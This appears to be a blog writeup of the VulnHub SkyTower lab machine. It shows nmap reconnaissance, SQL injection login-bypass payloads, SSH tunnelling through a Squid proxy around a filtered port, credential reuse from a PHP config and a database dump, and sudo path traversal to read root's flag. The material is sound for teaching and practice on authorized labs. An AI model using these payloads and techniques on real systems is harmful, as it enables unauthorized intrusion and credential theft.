---
layout: post
title: VulnHub Sky Tower Writeup  
subtitle: Medium Machine
tags: [VulnHub]
---

# VulnHub SkyTower Writeup - A Beginner's Guide to Ethical Hacking

## Introduction

This writeup details the process of compromising the SkyTower machine from VulnHub, a platform that provides virtual machines for practicing ethical hacking skills. This guide is designed for beginners and will explain each step in detail, including the tools used and the reasoning behind each action.

## Initial Reconnaissance

### Identifying the Target Machine

The first task in any penetration testing scenario is to identify the target machine on the network. We use a tool called `nmap` (Network Mapper) to scan our subnet and discover active hosts.

```bash
┌──(kali㉿kali)-[~/vulnhub/skyTower]
└─$ nmap 192.168.56.0/24                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 12:31 EDT
Nmap scan report for 192.168.56.101
Host is up (0.00030s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
22/tcp   filtered ssh
80/tcp   open     http
3128/tcp open     squid-http
```

In this output, we can see that the IP address 192.168.56.101 has three interesting ports:
- Port 22 (SSH) is filtered, which means there's likely a firewall blocking direct access.
- Port 80 (HTTP) is open, indicating a web server.
- Port 3128 (Squid HTTP Proxy) is open, which could be useful for pivoting later.

### Detailed Port Scan

Once we've identified our target, we perform a more detailed scan of the open ports to gather more information about the services running on them.

```bash
┌──(kali㉿kali)-[~/vulnhub/skyTower]
└─$ nmap 192.168.56.101 -p 22,80,3128 -sVC
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 12:31 EDT
Nmap scan report for 192.168.56.101
Host is up (0.00024s latency).

PORT     STATE    SERVICE    VERSION
22/tcp   filtered ssh
80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Debian)
3128/tcp open     http-proxy Squid http proxy 3.1.20
|_http-server-header: squid/3.1.20
|_http-title: ERROR: The requested URL could not be retrieved
```

This scan provides more details about each service:
- Port 22 (SSH) is still shown as filtered.
- Port 80 is running Apache httpd 2.2.22 on Debian.
- Port 3128 is running Squid http proxy version 3.1.20.

## Web Application Exploitation HTTP 80

### Exploring the Web Application

Next, we navigate to the web application running on port 80. While the writeup doesn't provide details about the initial page, we can assume it contains a login form that we'll try to exploit.

### SQL Injection Attempt
On the main page there is a login form. We attempt a simple SQL injection by inputting the following into the login form:

```sql
' or 1==1;--
```

This results in an error message:

```
There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '11;' and password='' 11;'' at line 1]
```

This error message confirms that the application is vulnerable to SQL injection, but there seems to be some filtering in place.

### Step 5: Refining the SQL Injection

We try a different SQL injection payload:

```sql
' || 1=1#
```

This payload successfully bypasses the login mechanism, and we're presented with the following message:

```
**Welcome john@skytech.com**

**As you may know, SkyTech has ceased all international operations.**

To all our long term employees, we wish to convey our thanks for your dedication and hard work.

**Unfortunately, all international contracts, including yours have been terminated.**

The remainder of your contract and retirement fund, **$2**, has been payed out in full to a secure account. For security reasons, you must login to the SkyTech server via SSH to access the account details.

**Username: john**
**Password: hereisjohn**

We wish you the best of luck in your future
```

This message provides us with SSH credentials for a user named "john".

## Gaining Initial Access

### Attempting SSH Access

Attempting to SSH directly into the machine doesn't work, as we discovered earlier that port 22 is filtered. However, we can use the Squid proxy we found on port 3128 to bypass this restriction.

### Setting Up a Proxy Tunnel

We use the `proxytunnel` tool to set up a tunnel through the Squid proxy:

```bash
proxytunnel -p 192.168.56.101:3128 -d 127.0.0.1:22 -a 1234 
```

This command forwards traffic from our local port 1234 to the internal VM's port 22 (SSH) through the proxy server.

### SSH Access via Proxy

We can now SSH into the machine using the proxy tunnel:

```bash
┌──(kali㉿kali)-[~/vulnhub/skyTower]
└─$ ssh john@localhost -p 1234 /bin/bash
john@localhost's password: 
whoami
john
rm .bashrc
```

We append `/bin/bash` to force the connection to stay open and then remove `.bashrc` to prevent it from causing issues.

## Privilege Escalation

### Enumerating the System

We explore the file system and find the source code of the web application in `/var/www/html/login.php`. This file contains database credentials:

```php
<?php

$db = new mysqli('localhost', 'root', 'root', 'SkyTech');

```

### Accessing the Database

Using these credentials, we can access the MySQL database:

```sql
mysql -uroot -proot

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| SkyTech            |
| mysql              |
| performance_schema |
+--------------------+

mysql> use SkyTech;
Database changed

mysql> show tables;
+-------------------+
| Tables_in_SkyTech |
+-------------------+
| login             |
+-------------------+
1 row in set (0.00 sec)

mysql> select * from login;
+----+---------------------+--------------+
| id | email               | password     |
+----+---------------------+--------------+
|  1 | john@skytech.com    | hereisjohn   |
|  2 | sara@skytech.com    | ihatethisjob |
|  3 | william@skytech.com | senseable    |
+----+--------------------
```

We've now discovered credentials for two additional users: sara and william.

###  Lateral Movement to Sara

We use Sara's credentials to gain access to her account:

```
┌──(kali㉿kali)-[~/vulnhub/skyTower]
└─$ ssh sara@localhost -p 1234          
sara@localhost's password: 
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Sep  3 12:56:54 2024 from localhost
```

We discover that Sara has sudo privileges to run `cat` and `ls` on files in the `/accounts/` directory.
```
sara@SkyTower:~$ sudo -l
Matching Defaults entries for sara on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
```

### Exploiting Sudo Privileges

We can use Sara's sudo privileges to read files outside of the `/accounts/` directory by using path traversal:

```
sara@SkyTower:~$ sudo cat /accounts/../../../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
sara@SkyTower:~$ 
```

This allows us to read the root flag and obtain the root password.

## Conclusion

In this walkthrough, we successfully compromised the SkyTower machine by:

1. Discovering open ports and services using nmap.
2. Exploiting a SQL injection vulnerability in the web application.
3. Using a proxy tunnel to bypass firewall restrictions.
4. Enumerating the system to find database credentials.
5. Performing lateral movement to access a user with sudo privileges.
6. Exploiting sudo privileges to read sensitive files and obtain root access.

This demonstrates the importance of proper input validation, secure network configuration, and the principle of least privilege in maintaining system security. Remember, these techniques should only be used in authorized, ethical hacking scenarios or on your own systems for educational purposes.